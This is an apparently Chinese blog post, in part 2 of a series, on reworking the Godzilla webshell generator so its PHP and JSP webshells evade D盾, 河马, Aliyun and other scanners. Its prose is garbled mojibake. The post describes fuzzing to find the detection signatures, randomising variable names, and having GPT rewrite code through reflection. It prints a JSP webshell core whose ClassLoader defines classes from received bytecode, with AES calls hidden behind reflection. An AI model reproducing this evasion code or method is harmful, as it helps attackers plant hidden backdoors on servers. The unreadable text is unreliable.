#  å“¥æ–¯æ‹‰äºŒå¼€ä»0åˆ°1-2(å…æ€)   
 å“ˆæ‹‰å°‘å®‰å…¨å°é˜Ÿ   2025-01-31 06:44  
  
Â   
##### å‰è¨€  
  
æœ‰å°ä¼™ä¼´æè®®è¯´ï¼Œæˆ‘ä»¬ä¸Šä¸ªæ–‡ç« æ”¹äº†ä¸€ä¸‹å“¥æ–¯æ‹‰çš„æµé‡ï¼Œä½†æ˜¯åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œæˆ‘ä»¬æ‰“æˆ˜è‚¯å®šè¦å…ˆä¼ æœ¨é©¬è½åœ°ï¼Œå¦‚æœä¸èƒ½è½åœ°ï¼Œé‚£ä¹ˆä½ æµé‡æ”¹çš„å†å¥½ï¼Œå…¶å®ä¹Ÿæ²¡æœ‰æ„ä¹‰ï¼Œæƒ³æƒ³ï¼Œç¡®å®ä¹Ÿæ˜¯ã€‚æ²¡æœ‰ç¬¬ä¸€æ­¥ä¸Šä¼ æ–‡ä»¶ï¼Œå“ªé‡Œå­˜åœ¨æµé‡å‘¢ã€‚  
  
é‚£ä¹ˆè¿™æ¬¡å’±ä»¬æ¥åšä¸€ä¸‹å…æ€ã€‚åœ¨å®é™…çš„åº”ç”¨ä¸­ï¼Œä¼¼ä¹æˆ‘ä»¬ç»å¸¸ç¢°åˆ°å®‰å…¨è®¾å¤‡ï¼Œå¥ˆä½•å’±è¿™ä¹Ÿæ²¡æœ‰å•¥å®‰å…¨è®¾å¤‡ï¼Œæˆ‘ä»¬å°±é‡‡ç”¨å¸¸è§çš„å‚å•†çš„åœ¨çº¿æ€è½¯å§ã€‚å¦‚æœæœ‰å°ä¼™ä¼´æœ‰çš„è¯ï¼Œå¯ä»¥å¸®æˆ‘æµ‹æµ‹ï¼ŒæŠŠç»“æœå‘Šè¯‰æˆ‘ï¼Œç¬”è€…å†è¿›è¡Œä¼˜åŒ–ã€‚  
##### php å…æ€  
  
æˆ‘ä»¬ç”¨é»˜è®¤ç”Ÿæˆçš„æ–‡ä»¶ï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNicOlzZqDWKhZtNjpJzODS5YBb2Sz8ibzs79hznqFoV2XbQU5m0qtOQGA/640?wx_fmt=png&from=appmsg "")  
  
  
æ‹–åˆ°dç›¾ä¸­ï¼Œçœ‹ä¸€ä¸‹  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN33C34MW8h6ibtia64icI7k4enoTOq8xKf4ueUdJSEaCiaLVsuO6CFlZB2g/640?wx_fmt=png&from=appmsg "")  
  
  
ä¼šæŠ¥3çº§çš„åŒå±‚å˜é‡ï¼Œé‚£å¥½åŠï¼Œæ‹¿å‡ºæ¥å°±è¡Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN5Hgu5db1Weib3icAznTa3PGY2oQdwCrPGkIq6zrAqFtbRIqmL1tdLsvA/640?wx_fmt=png&from=appmsg "")  
  
  
è®©ä»–å…ˆç­‰äºä¸€ä¸ªå˜é‡ï¼Œå†ä¼ é€’å°±å¯ä»¥äº†ã€‚  
  
å®Œäº‹ä¹‹åï¼Œå°±å¯ä»¥äº†  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNMBHCDYgutCKvBONZol2PSxGc1LOfG1ibQKBryhy8ksyLSpUdDB5ZDTw/640?wx_fmt=png&from=appmsg "")  
  
  
æ²¡æœ‰a.phpäº†ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNxGjMcgMetxAGoE0VnVPCMapqrjglyCP29pF9mcEHgJRDfU9JAyqic4g/640?wx_fmt=png&from=appmsg "")  
  
  
æ²³é©¬æŠ¥æ¯’ï¼Œæˆ‘ä»¬ä½¿ç”¨fuzzæ–¹æ³•çœ‹ä¸€ä¸‹å“ªé‡Œæœ‰é—®é¢˜ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNF7J1w8sslYQUagMExwPqibp27oXMicJRePN3HcthkSU7icNSzwj9EDw0A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNZTyQS4iaFY5PQvSefUuib4CACFpTiaMRgSlmq3icJ5EXH4Zibl9OWn22ahA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œç»è¿‡fuzzï¼Œè¿™é‡Œæœ‰$qianxinITUfjjXmxo2($_POST[$qianxinw7hJzkKxyi])  
çš„æ—¶å€™ï¼Œé‚£ä¹ˆå°±æŠ¥æ¯’ï¼Œé‚£ç®€å•ï¼Œç›´æ¥ç»™ä»–æ‹†å‡ºæ¥ï¼Œç”¨å˜é‡å†™ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNibzJFicaaZraXSKeE17QicGGurPCHSOstW3EbK6gzzQmhuySQ9jaSgOMQ/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™æ ·å†™ï¼Œå°±å¯ä»¥äº†  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNm9R551GhgtOMeUCVuTUHZZRsbd2ztHsSPfWKhCOjqeCPuRoA39NWWA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œæœ¬åœ°ç‰ˆçš„æ²³é©¬æ˜¯æ²¡æœ‰é—®é¢˜äº†ï¼Œä½†æ˜¯å§ï¼Œåœ¨çº¿ç‰ˆçš„æ²³é©¬å°±æ˜¯è¿‡ä¸å»ï¼Œåªè¦å‡ºç°evalï¼Œå°±ç›´æ¥æŠ¥ã€‚æš‚æ—¶æ²¡æœ‰å¤ªå¥½çš„åŠæ³•ã€‚åœ¨çº¿åŠ å¯†ä¹Ÿè¡Œï¼Œä¸è¿‡æ¯”è¾ƒéº»çƒ¦ã€‚è¿™é‡Œå°±ä¸å†™äº†  
  
åƒdç›¾æ²³é©¬è¿™ç§éƒ½æ˜¯é™æ€æŸ¥æ€çš„ï¼Œä»–ä¸ç®¡ä½ é‡Œé¢çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå‡ºç°evalè¿™ç§æˆ–è€…eval() eval(chuanchan) å°±ä¼šæŠ¥ï¼Œdç›¾è¿˜å¥½è§£å†³ä¸€ç‚¹ï¼Œç”¨ç±»å¯ä»¥ç»•ï¼Œä½†æ˜¯æŠŠ æ²³é©¬æ­»æ´»ç»•ä¸è¿‡ï¼Œå…ˆæä¸‹å§ã€‚  
  
å®é™…ä¸­ï¼Œæˆ‘ä»¬ç»å¸¸ä¼šè§åˆ°ä¸€ä¸‹å•†ä¸šwafï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNugIhjt2sLOd6Xj0Jqq41oibrsgaut21ZgHNZh9FFVvKmvJOrsr1n0xA/640?wx_fmt=png&from=appmsg "")  
  
å¾®æ­¥æ²¡æŠ¥ï¼Œä½†æ˜¯ä»–è¿™ä¸ªgtpè¯´å¯èƒ½æœ‰é—®é¢˜ã€‚  
ç«ç»’å’Œ360ã€‚ç«ç»’å’Œ360å¯¹webshellå…¶å®æ˜¯ä¸æ•æ„Ÿçš„ï¼Œç»ˆç«¯å®‰å…¨ï¼Œå¯¹cs æˆ–è€…msfçš„ğŸéƒ½æ¯”è¾ƒæ•æ„Ÿï¼Œæ‰€ä»¥æ„Ÿè§‰è¿™ä¸ªï¼Œæ²¡å•¥æ„ä¹‰ã€‚ä¹Ÿæµ‹ä¸€ä¸‹å§ã€‚  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN427Au1uy9sH5QhCdYVSaDw1odIjukQBQ7MzDYva39j7W0ZsVFehboA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN8ib4sPxMdxHj5bSglY9v6Rjlzicpfnq7bIItG1gicSIoyKzqMpGcnDn5Q/640?wx_fmt=png&from=appmsg "")  
  
  
é˜¿é‡Œäº‘æŠ¥äº†å¯ç–‘ï¼Œæ²¡æœ‰ç»•è¿‡å»ã€‚è¿™ä¸ªevalæ²¡æœ‰è¿‡å»  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNXlHiciaEVUCf1X35ngUTcM3E4U2V41nTnaHZjyGWSRoiaoghX3ib6ic2NzA/640?wx_fmt=png&from=appmsg "")  
  
  
å¥½ï¼Œphpçš„å…æ€å°±å…ˆåˆ°è¿™é‡Œå§ã€‚å¥ˆä½•ç¬”è€…å¤ªèœäº†ï¼ŒåŠ¨æ€çš„webshellæŸ¥æ€éƒ½è¿‡ä¸å»ã€‚  
  
ç¬”è€…åœ¨æµ‹è¯•php5çš„æ—¶å€™ï¼Œå‘ç°  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNGF8uoBF477M77yRvVy5JUh2ibKtPgpQMI0eIEcEorK1lOSNiagM0APow/640?wx_fmt=png&from=appmsg "")  
  
  
  
http_response_code(404);è¿™è¡Œä»£ç æ—¶æŠ¥é”™çš„  
  
åœ¨phpå®˜ç½‘çœ‹ï¼Œå‘ç°http_response_codeåªåœ¨(PHP 5 >= 5.4.0, PHP 7, PHP 8)æ”¯æŒã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNPT0xWIIPRwBJbYPGk0Xm83rLEjn9PymlP9Es6I6kBnDTeI1f9xL6MQ/640?wx_fmt=png&from=appmsg "")  
  
  
ä¸è¿‡ï¼Œä¸‹é¢åœ¨åä¸€å¹´å‰ï¼Œæœ‰å¤§ç‰›å·²ç»ç»™å‡ºäº†è§£å†³æ–¹æ³•ï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNTIyIxc4uuN781X448d9SFLFZLSPRaaBXIU8Hiagia1uQl9usiaCNdmyIg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNuwlqg7f0BVnkA05KL5xjGsicXIQUTib9eI3FyUNB9GcqYnZibic20En7hQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNIMLNgJcfSEPQGe5P3922MjSM6DA8dtRls3cCnpUN1H4j6ObDz9UwCw/640?wx_fmt=png&from=appmsg "")  
  
  
å¥½ï¼Œè¿™é‡Œæˆ‘ä»¬å°±æ”¹å®Œäº†ã€‚  
  
ç”¨ç¬”è€…å¼€çš„è¿™ä¸ªå·¥å…·ï¼Œä½ ä¼šå‘ç°ï¼Œæ¯æ¬¡ç”Ÿæˆçš„ğŸéƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ³¨é‡Šä»€ä¹ˆçš„ï¼Œå’Œå˜é‡åï¼Œéƒ½ä¸€æ ·ã€‚  
  
æˆ‘ä»¬æƒ³åŠæ³•ç»™ä»–å†™ä¸€ä¸‹ï¼Œè®©ä»–å˜åŠ¨èµ·æ¥ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNRone5wFK58zmuDcCTRQzc2NZ7uqutDxejMico1FOTJCqiabLzqAMBtEw/640?wx_fmt=png&from=appmsg "")  
  
  
æˆ‘ä»¬åœ¨åŸç‰ˆä¸­å¯ä»¥çœ‹åˆ°ï¼Œè¯»å–å“¥æ–¯æ‹‰é»˜è®¤ç”Ÿæˆæ¨¡æ¿binæ–‡ä»¶åï¼Œä¼šæ›¿æ¢pass å’Œkeyã€‚  
  
é‚£ä¹ˆç›¸åº”çš„ï¼Œæˆ‘ä»¬å®šä¹‰å‡ ä¸ªå˜é‡ï¼Œè®©ä»–éšæœºæ›¿æ¢å³å¯ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNv5ZOSjmuqgOcjE8HEDc2nFkzIUYianictKbelgxHp2PNHQicsA8ZIDwaw/640?wx_fmt=png&from=appmsg "")  
  
  
é¦–å…ˆæˆ‘ä»¬åœ¨æ–¹æ³•é‡Œå®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œç„¶åè¿›è¡Œéšæœºæ’åºï¼Œç„¶åå†ç»™ä»–æ‹¿å‡ºæ¥ç”¨ï¼Œå°±å¯ä»¥äº†ã€‚è¿™é‡Œç”¨äº†å‡ ä¸ªå­—ç¬¦ä¸²ã€‚ç„¶ååˆ†åˆ«è¿›è¡Œæ›¿æ¢æ‰ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN6YUibym9jC33gnGR0Pnb2wBh9qmAhZ9PHmgS0jVgMhV4tZIkMt2gZfQ/640?wx_fmt=png&from=appmsg "")  
  
  
æˆ‘ä»¬å†åœ¨binæ–‡ä»¶ä¸­ï¼Œå†™ä¸Šç›¸åº”çš„æ‰€éœ€è¦æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥äº†ã€‚æ‰“åŒ…ï¼Œç¼–è¯‘ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNhTcrKGGBVOfKqIR3GE8MPQbQZEt1AncJPUmCqmmIxeurxnsEFX5Vhg/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™æ ·ï¼Œæˆ‘ä»¬æ¯æ¬¡ç”Ÿæˆçš„æœ¨é©¬å°±ä¸ä¸€æ ·äº†ã€‚å°±åŠ¨æ€äº†ã€‚ä½†æ˜¯å…¶å®æ€»ä½“ç»“æ„è¿˜æ˜¯ä¸å˜çš„ã€‚å˜å¾—åªæ˜¯å˜é‡ã€‚  
  
æ²¡äº‹ï¼Œèƒ½ç”¨å°±è¡Œï¼Œåé¢å†ä¼˜åŒ–ã€‚å¥½äº† phpçš„å…æ€å°±å…ˆåšåˆ°è¿™é‡Œï¼Œä¸‹é¢æ˜¯jspçš„ã€‚  
##### jsp  
  
ç¯å¢ƒï¼šApache Tomcat/9.0.65  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN3B0zF8ez6Fc5rQ0fukvpxGmq86s0ke54tCcuQia7Myzia4GpjQxQhKibQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
ä¸Šæ¥å°±æ˜¯å·²çŸ¥åé—¨ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯è¢«åŒ¹é…åˆ°äº†å…³é”®å­—ï¼Œfuzzä¸€ä¸‹ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN1SlWo8F271FvKBlHvFBQNV3PCRorBAKeKPH4tmRYg6dzCicNeO6Bh7Q/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNnrGI5iaBvptYSkM25ibvmuVzpYN6VV5EFYuW7zplVLE9zvibPC31ohmfg/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNE6h8Ey4ZB89q68wONguAN9dhSyFJ9CyEZCar9xxHBnIh9KhybVz3QA/640?wx_fmt=png&from=appmsg "")  
  
  
åœ¨ä¸¤æ¬¡çš„ğŸä¸­å¯ä»¥çœ‹åˆ°ï¼Œåº”è¯¥æ˜¯åŒ¹é…äº†cipherã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNniaawBfWakEh86TiaChhH7qKvjHzmfLbHRv1DhnLNIJVtkgcib95wZqdg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNniaawBfWakEh86TiaChhH7qKvjHzmfLbHRv1DhnLNIJVtkgcib95wZqdg/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™é‡Œç»™ä»–æ¢æˆUnicodeè¿˜æ˜¯æŠ¥ï¼Œé‚£å¯èƒ½è¿˜æœ‰å…³é”®è¯ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNlaF3Dw38Sl1BRBs94VYX8WJEz5XF6geGDc3ej98SzBrMq8Y05wwY0A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNyQQJDABMkp3yDhb6pXSLG54Vk3ZBtRibWH2y8vAT41tKzOpZZMTNHmg/640?wx_fmt=png&from=appmsg "")  
  
aesä¹Ÿæœ‰é—®é¢˜ã€‚ok,ä¹Ÿç»™ä»–ç¼–ç ä¸€ä¸‹ï¼Œä¸‹åŠéƒ¨åˆ†ä¹Ÿæœ‰é—®é¢˜ï¼Œæ”¹æ”¹ã€‚  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN3OCQSJExcSlDIFBvBBNw8DsCakB71AmokpJdhuttJto2ZCy8u9zsMQ/640?wx_fmt=png&from=appmsg "")  
  
  
æˆ‘ä»¬åœ¨æ”¹è¿™ä¸ªçš„æ—¶å€™å‘ç°å°±ç®—æœ‰è¿™ä¸€å¥ï¼Œä¹ŸæŠ¥å·²çŸ¥ï¼Œé‚£è¯´æ˜ï¼Œè¿™ä¸ªé‡Œé¢çš„\uå•¥å•¥å•¥çš„ä¹Ÿè¢«æ ‡è®°äº†ã€‚  
  
æˆ‘ä»¬åœ¨æµ‹è¯•çš„æ—¶å€™ï¼Œå‘ç°é˜¿é‡Œäº‘æ‹¦æˆªçš„ï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN3OCQSJExcSlDIFBvBBNw8DsCakB71AmokpJdhuttJto2ZCy8u9zsMQ/640?wx_fmt=png&from=appmsg "")  
  
  
è¿™ç§åå°„åŠ è½½ç±»çš„ invokeæ–¹å¼è‚¯å®šæ˜¯è¢«æ‹¦æˆªçš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è®©gptå¸®æˆ‘ä»¬å†™ä¸€ä¸‹ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNtguoxYTZeO1WxCsia4J75QECUYqOpiaGdlnxatUkG01vE92Wka1V7B6g/640?wx_fmt=png&from=appmsg "")  
  
  
å°±ç±»ä¼¼äºè¿™ç§ã€‚è¿™æ ·çš„è¯ï¼Œé˜¿é‡Œäº‘å°±ä¸æŠ¥äº†ã€‚  
  
åŸæœ¬çš„å“¥æ–¯æ‹‰åˆ†ä¸¤åŠéƒ¨åˆ†ï¼Œä¸Šéƒ¨åˆ†ä¸ºå®šä¹‰çš„å„ç§æ–¹æ³•ã€‚å¦‚md5 base64 en decode aesç­‰ï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNlJyWT1h9UZPZHOM1VINhvsCquSNdiaVzbSoZBfxKL6WZHWjhajfe28g/640?wx_fmt=png&from=appmsg "")  
  
  
ä¸‹åŠéƒ¨åˆ†ä¸ºï¼Œæ­£çœŸçš„ä¼ å‚é€»è¾‘ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNIQibNF6oIORZuRt3O3yPtJOE3xYfkoPiaqtQLdMCsQeibjeCUgPBc1ong/640?wx_fmt=png&from=appmsg "")  
  
  
æˆ‘ä»¬è®©gptå¸®æˆ‘ä»¬æ”¹ä¸€ä¸‹ï¼Œä¸ŠåŠéƒ¨åˆ†ï¼Œç”¨åå°„æœºåˆ¶ï¼Œå¹¶ä¸”é¿å…invokeå‡ºç°ã€‚  
  
å·¦è¾¹ä¸ºæ²¡æœ‰ä¸‹ç­éƒ¨åˆ†ï¼Œå³è¾¹æ˜¯æœ‰çš„  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN2ibwO2c09pwTVs6d9YcQshBWp0KiaoYF4Cskv6cunnIYXTYRfYvRicrfQ/640?wx_fmt=png&from=appmsg "")  
  
  
å¯ä»¥çœ‹åˆ°ï¼Œä¸ŠåŠéƒ¨åˆ†å·²ç»æ²¡æœ‰é—®é¢˜äº†ï¼Œä¸‹åŠéƒ¨åˆ†è¿˜æ˜¯æœ‰é—®é¢˜ï¼Œæ”¾ä¸€ä¸‹ğŸã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYNsMYN3fJdErZLaj8EulODBliam0zkUv6ucUySfNSjfg9ib1ESzz4mEm0w/640?wx_fmt=png&from=appmsg "")  
  
  
é˜¿é‡Œäº‘ä¹ŸæŠ¥ï¼Œä»–æ˜¯æŠ¥çš„f.equals(pageContext);ã€‚é‚£æˆ‘ä»¬å†æ”¹ä¸€ä¸‹ã€‚ğŸçš„æ ¸å¿ƒé€»è¾‘ã€‚  
```
<%!Â 
Â  Â Â StringÂ xcÂ =Â "3c6e0b8a9c15224a";Â 
Â  Â Â StringÂ passÂ =Â "pass";Â 
Â  Â Â StringÂ md5Â =Â md5(pass + xc);Â 
Â  Â Â 
Â  Â Â classÂ XÂ extendsÂ ClassLoaderÂ {
Â  Â  Â  Â Â publicÂ X(ClassLoader z)Â {
Â  Â  Â  Â  Â  Â Â super(z);
Â  Â  Â  Â  }
Â  Â  Â  Â Â 
Â  Â  Â  Â publicÂ ClassÂ Q(byte[] cb)Â {
Â  Â Â tryÂ {
Â  Â  Â  Â Â returnÂ super.defineClass(null, cb,Â 0, cb.length);
Â  Â  }Â catchÂ (ClassFormatError e) {
Â  Â  Â  Â Â // å¯ä»¥åœ¨è¿™é‡Œæ•è·å¹¶å¤„ç†å¼‚å¸¸
Â  Â  Â  Â  e.printStackTrace();
Â  Â  Â  Â Â returnÂ null;
Â  Â  }
}
Â  Â  }Â 
publicÂ byte[] x(byte[] s,Â booleanÂ m) {Â 
Â  Â Â tryÂ {
Â  Â  Â  Â Â // è·å– Cipher ç±»
Â  Â  Â  Â  Class<?> cipherClass = Class.forName("javax.crypto.Cipher");

Â  Â  Â  Â Â // è·å– Cipher.getInstance("AES") æ–¹æ³•å¹¶è°ƒç”¨
Â  Â  Â  Â  java.lang.reflect.MethodÂ getInstanceMethodÂ =Â cipherClass.getMethod("getInstance", String.class);
Â  Â  Â  Â Â ObjectÂ cipherÂ =Â getInstanceMethod.invoke(null,Â "AES");

Â  Â  Â  Â Â // è·å– SecretKeySpec ç±»å¹¶åˆ›å»ºå¯¹è±¡
Â  Â  Â  Â  Class<?> secretKeySpecClass = Class.forName("javax.crypto.spec.SecretKeySpec");
Â  Â  Â  Â  java.lang.reflect.Constructor<?> secretKeySpecConstructor = secretKeySpecClass.getConstructor(byte[].class, String.class);
Â  Â  Â  Â Â ObjectÂ keyÂ =Â secretKeySpecConstructor.newInstance(xc.getBytes(),Â "AES");

Â  Â  Â  Â Â // è·å– Cipher.init æ–¹æ³•å¹¶è°ƒç”¨
Â  Â  Â  Â  java.lang.reflect.MethodÂ initMethodÂ =Â cipherClass.getMethod("init",Â int.class, java.security.Key.class);
Â  Â  Â  Â  initMethod.invoke(cipher, m ?Â 1Â :Â 2, key);

Â  Â  Â  Â Â // è·å– Cipher.doFinal æ–¹æ³•å¹¶è°ƒç”¨
Â  Â  Â  Â  java.lang.reflect.MethodÂ doFinalMethodÂ =Â cipherClass.getMethod("doFinal",Â byte[].class);
Â  Â  Â  Â Â returnÂ (byte[]) doFinalMethod.invoke(cipher, (Object) s);
Â  Â  }Â catchÂ (Exception e) {
Â  Â  Â  Â  e.printStackTrace();
Â  Â  Â  Â Â returnÂ null;
Â  Â  }
}
Â  Â Â publicÂ staticÂ StringÂ md5(String s)Â {
Â  Â  Â  Â Â StringÂ retÂ =Â null;
Â  Â  Â  Â Â tryÂ {
Â  Â  Â  Â  Â  Â  java.security.MessageDigest m;
Â  Â  Â  Â  Â  Â  m = java.security.MessageDigest.getInstance("MD5");
Â  Â  Â  Â  Â  Â  m.update(s.getBytes(),Â 0, s.length());
Â  Â  Â  Â  Â  Â  ret =Â newÂ java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
Â  Â  Â  Â  }Â catchÂ (Exception e) {}
Â  Â  Â  Â Â returnÂ ret;
Â  Â  }
Â  Â Â 
Â  Â Â publicÂ staticÂ StringÂ base64Encode(byte[] bs)Â {
Â  Â  Â  Â Â tryÂ {
Â  Â  Â  Â  Â  Â Â // ä½¿ç”¨ java.util.Base64
Â  Â  Â  Â  Â  Â  java.util.Base64.EncoderÂ encoderÂ =Â java.util.Base64.getEncoder();
Â  Â  Â  Â  Â  Â Â returnÂ encoder.encodeToString(bs);
Â  Â  Â  Â  }Â catchÂ (Exception e) {
Â  Â  Â  Â  Â  Â  e.printStackTrace();
Â  Â  Â  Â  Â  Â Â returnÂ null;
Â  Â  Â  Â  }
Â  Â  }

Â  Â Â // é¿å… invoke ç›´æ¥ä½¿ç”¨ Base64 ç±»
Â  Â Â publicÂ staticÂ byte[] base64Decode(String bs) {
Â  Â  Â  Â Â tryÂ {
Â  Â  Â  Â  Â  Â Â // ä½¿ç”¨ java.util.Base64
Â  Â  Â  Â  Â  Â  java.util.Base64.DecoderÂ decoderÂ =Â java.util.Base64.getDecoder();
Â  Â  Â  Â  Â  Â Â returnÂ decoder.decode(bs);
Â  Â  Â  Â  }Â catchÂ (Exception e) {
Â  Â  Â  Â  Â  Â  e.printStackTrace();
Â  Â  Â  Â  Â  Â Â returnÂ null;
Â  Â  Â  Â  }
Â  Â  }
%>
```  
  
çŸ¥é“å“ªé‡Œæœ‰é—®é¢˜ï¼Œå°±å¥½æ”¹äº†ã€‚  
  
æˆ‘ä»¬ç›´æ¥åœ¨dç›¾å¤„åˆ äº† é˜¿é‡Œäº‘æŠ¥çš„ f.æ˜¯ä¸è¡Œçš„ï¼Œ  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN9gHMs9IXLIYEE61iagqB5EgLltS3ic1LgzQkLBMy8giaaeI3ANccHhQ4w/640?wx_fmt=png&from=appmsg "")  
  
  
æ”¹äº†ä¸€ä¸‹å˜é‡åï¼Œä¹Ÿä¸è¡Œã€‚  
  
ç»è¿‡ä¸€å¤©çš„æµ‹è¯•ï¼Œå‘ç°ï¼Œå¥½åƒç»•ä¸è¿‡é˜¿é‡Œäº‘äº†ã€‚ï¼Œå¤ªèœäº†ã€‚å…ˆè¿™æ ·ã€‚  
  
aliyunä¼šåŒ¹é…f.equals(pageContext);  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYND6hsGqOTJBPuwXRiaf6guoOh8GZn65PktZZ60Kt3lndLQESS76fPgPw/640?wx_fmt=png&from=appmsg "")  
  
  
æ”¹æˆunicodeä¹Ÿä¸è¡Œï¼Œaliyunæ˜¯åŠ¨æ€çš„ï¼Œä»–ä¼šè¿è¡Œã€‚å…¶ä»–çš„éƒ½ç”¨åå°„å†™å¥½äº†ã€‚  
  
å“¦ï¼Œå¯¹äº†ï¼Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯è¿™ä¸ªdefineClass(null, cb, 0, cb.length);æ–¹æ³•ã€‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/YASaCnhaOWNbgyeNL7iccst0ZMnKmsNYN3BDlLhmLoL9XWz4QzkqTjcjKTuFXaFSSdhba9onE6rY8ICicwtBEOFA/640?wx_fmt=png&from=appmsg "")  
  
  
https://xz.aliyun.com/t/11368  
  
åœ¨è¿™ç¯‡å¤§å¸ˆå‚…çš„æ–‡ç« ä¸­ï¼Œè¯¦ç»†è¯´äº†è¿™ä¸ªï¼Œå“¥æ–¯æ‹‰å’Œå†°èéƒ½æ˜¯è¿™æ ·çš„éœ€è¦defineClassæ–¹æ³•æ¥åŠ è½½æ¶æ„ç±»å­—èŠ‚ç ï¼Œä¼¼ä¹éœ€è¦è‡ªå®šä¹‰ClassLoaderæ¥ç»•è¿‡äº†ã€‚æˆ–è€…æ”¹payloadäº†ã€‚  
  
